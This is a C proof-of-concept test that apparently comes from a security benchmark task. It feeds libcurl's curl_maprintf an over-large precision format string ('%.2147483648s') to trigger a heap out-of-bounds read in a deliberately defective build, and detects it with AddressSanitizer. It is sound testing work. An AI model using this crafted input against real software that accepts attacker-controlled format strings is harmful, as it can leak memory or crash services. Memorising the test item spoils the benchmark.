/*
 * Proof-of-concept probe for a delocalized memory-safety defect in libcurl's
 * printf implementation, reached through the public mprintf API.
 *
 * Threat model (per task): the format string handed to curl's printf family is
 * attacker-influenced (classic format-string exposure). Here we drive the
 * public curl_maprintf() with an in-contract format whose precision field is a
 * large decimal literal just above INT_MAX ("%.2147483648s").
 *
 * On a correct libcurl this is harmless: the precision literal overflows the
 * INT_MAX bound in the number parser and the conversion is rejected, so
 * curl_maprintf() simply returns an empty string. The precision is also only
 * ever used by a NUL-stopping scan, so even an over-large precision never reads
 * past the argument string.
 *
 * On the defective tree two independently-benign maintenance changes combine:
 *   1) the number parser accepts a precision one step past INT_MAX, which the
 *      (int) cast then turns into a negative precision, and
 *   2) out_string() treats any negative precision as "no precision" and emits
 *      exactly `precision` bytes without the NUL-stopping scan.
 * Together, the negative precision becomes a gigantic byte count that is copied
 * straight out of the (short) argument buffer -> heap out-of-bounds read.
 *
 * Build: cc -fsanitize=address probe.c -lcurl
 * Expected on defective tree: AddressSanitizer heap-buffer-overflow (READ),
 * process aborts (SIGABRT / rc 134). Clean on the base tree.
 */

#include <curl/curl.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int main(void)
{
  char *out;

  /* A small, properly NUL-terminated heap string. Exactly 4 bytes so any read
     past index 3 is a heap overflow that AddressSanitizer catches. A correct
     libcurl never reads past the terminating NUL at index 3. */
  char *s = (char *)malloc(4);
  if(!s)
    return 2;
  memcpy(s, "abc", 4); /* 'a','b','c','\0' */

  /* Attacker-influenced format, supplied at run time (not a compile-time
     literal) exactly as a format-string-injection would deliver it. The
     precision 2147483648 is one past INT_MAX. */
  {
    char fmt[] = "%.2147483648s";
    out = curl_maprintf(fmt, s);
  }

  /* Reaching here means no overflow fired (the base/secure tree path): the
     parser rejected the out-of-range precision and we got an empty string. */
  printf("no-fire: out=\"%s\"\n", out ? out : "(null)");

  curl_free(out);
  free(s);
  return 0;
}
